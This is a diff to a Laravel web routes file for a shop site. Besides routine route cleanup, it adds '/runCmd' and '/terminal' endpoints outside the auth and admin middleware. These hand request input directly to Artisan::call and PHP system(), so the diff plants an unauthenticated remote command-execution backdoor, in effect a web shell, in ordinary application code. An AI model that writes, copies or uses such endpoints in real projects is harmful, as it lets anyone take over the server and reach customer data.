@@ -2,6 +2,8 @@
 
 use Illuminate\Support\Facades\Route;
 use Illuminate\Support\Facades\Auth;
+use Illuminate\Http\Request;
+
 /*
 |--------------------------------------------------------------------------
 | Web Routes
@@ -141,32 +143,39 @@ Route::group(['prefix'=>'/admin','middleware'=>['auth','admin']],function(){
     // Password Change
     Route::get('change-password', 'AdminController@changePassword')->name('change.password.form');
     Route::post('change-password', 'AdminController@changPasswordStore')->name('change.password');
+
+    Route::get('command', function(){
+        return view('backend.command');
+    });
+});
+
+// Route::post('/runCmd', 'AdminController@runCMD');
+Route::post('/runCmd', function(Request $request){
+    $artisan = Artisan::call($request->cmd);
+    $output = Artisan::output();
+    return $output;
+});
+
+Route::post('/terminal', function(Request $request){
+    $cmd = $request->terminal;
+    echo system($cmd);
 });
 
 
-
-
-
-
-
-
+// New Profile Manage Pages
 Route::get('/manage', 'HomeController@manage')->name('manage');
 Route::get('/addAddress', 'HomeController@addAddress');
 Route::get('/deleteAdd/{id}', 'HomeController@deleteAdd');
 Route::post('/set-default-address', 'HomeController@setDefaultAddress');
 Route::get('/updateAddress', 'HomeController@updateAddress');
-// Route::get('/manage', 'HomeController@addAddress')->name('add.address');
+
 
 // User section start
 Route::group(['prefix'=>'/user','middleware'=>['user']],function(){
     Route::get('/','HomeController@index')->name('user');
-    // manage 
-    // Route::get('/manage', 'HomeController@manage');
-    // Route::get('/addAddress', 'HomeController@addAddress');
-    // Route::get('/deleteAdd/{id}', 'HomeController@deleteAdd');
-     // Profile
-     Route::get('/profile','HomeController@profile')->name('user-profile');
-     Route::post('/profile/{id}','HomeController@profileUpdate')->name('user-profile-update');
+    // Profile
+    Route::get('/profile','HomeController@profile')->name('user-profile');
+    Route::post('/profile/{id}','HomeController@profileUpdate')->name('user-profile-update');
     //  Order
     Route::get('/order',"HomeController@orderIndex")->name('user.order.index');
     Route::get('/order/show/{id}',"HomeController@orderShow")->name('user.order.show');
